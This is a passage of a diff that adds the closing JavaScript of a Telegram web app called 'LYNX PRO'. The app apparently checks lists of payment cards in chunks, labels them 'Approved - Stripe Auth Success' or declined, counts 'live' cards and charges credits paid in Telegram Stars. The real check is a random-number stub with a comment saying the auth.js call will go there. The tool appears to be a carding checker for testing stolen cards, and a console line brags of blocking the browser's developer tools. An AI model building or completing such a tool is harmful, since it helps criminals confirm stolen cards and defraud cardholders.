+        if (chunkIndex >= chunks.length || processed >= toCheck) {
+            isRunning = false;
+            startBtn.textContent = '▶ Start';
+            startBtn.disabled = false;
+            updateStatsUI();
+            renderLiveList();
+            showToast('✅ Kontrol tamamlandı!');
+            return;
+        }
+        const chunk = chunks[chunkIndex];
+        chunkIndex++;
+
+        chunk.forEach((card, idx) => {
+            setTimeout(() => {
+                // ===== BURADA GERÇEK auth.js ÇAĞRILACAK =====
+                // Şimdilik simülasyon
+                const isLive = Math.random() > 0.4;
+                const result = isLive ? '✅ Approved - Stripe Auth Success' : '❌ Declined - Insufficient Funds';
+                if (isLive) { live++; approved++; }
+                else { declined++; }
+                totalChecked++;
+                credits--;
+                updateCreditsUI();
+
+                liveResults.push({ card, result });
+                processed++;
+                updateStatsUI();
+
+                // Her sonuçta live listeyi güncelle (canlı gösterim)
+                renderLiveList();
+
+                if (processed >= toCheck) {
+                    isRunning = false;
+                    startBtn.textContent = '▶ Start';
+                    startBtn.disabled = false;
+                    updateStatsUI();
+                    renderLiveList();
+                    showToast('✅ Kontrol tamamlandı!');
+                }
+            }, idx * 500);
+        });
+
+        setTimeout(processNextChunk, chunkSize * 500 + 300);
+    }
+
+    processNextChunk();
+});
+
+// ============================================================
+//  NAV
+// ============================================================
+document.querySelectorAll('.nav-item').forEach(btn => {
+    btn.addEventListener('click', function() {
+        document.querySelectorAll('.nav-item').forEach(b => b.classList.remove('active'));
+        this.classList.add('active');
+        const pageId = this.dataset.page;
+        document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+        const target = document.getElementById(pageId);
+        if (target) target.classList.add('active');
+    });
+});
+
+// ============================================================
+//  ÇIKIŞ
+// ============================================================
+document.getElementById('logoutBtn').addEventListener('click', function() {
+    if (window.Telegram && Telegram.WebApp) {
+        Telegram.WebApp.close();
+    } else {
+        showToast('🚪 Çıkış yapılıyor...');
+        window.close();
+    }
+});
+
+// ============================================================
+//  TOAST
+// ============================================================
+function showToast(msg) {
+    toast.textContent = msg;
+    toast.classList.add('show');
+    clearTimeout(toast._timer);
+    toast._timer = setTimeout(() => toast.classList.remove('show'), 3500);
+}
+
+// ============================================================
+//  BAŞLAT
+// ============================================================
+updateCreditsUI();
+renderLiveList();
+showToast('🚀 LYNX hazır.');
+
+console.log('LYNX PRO - Sade, Koyu, Profesyonel');
+console.log('🔒 F12 korumalı | Telegram Stars entegre');
+</script>
+</body>
+</html>
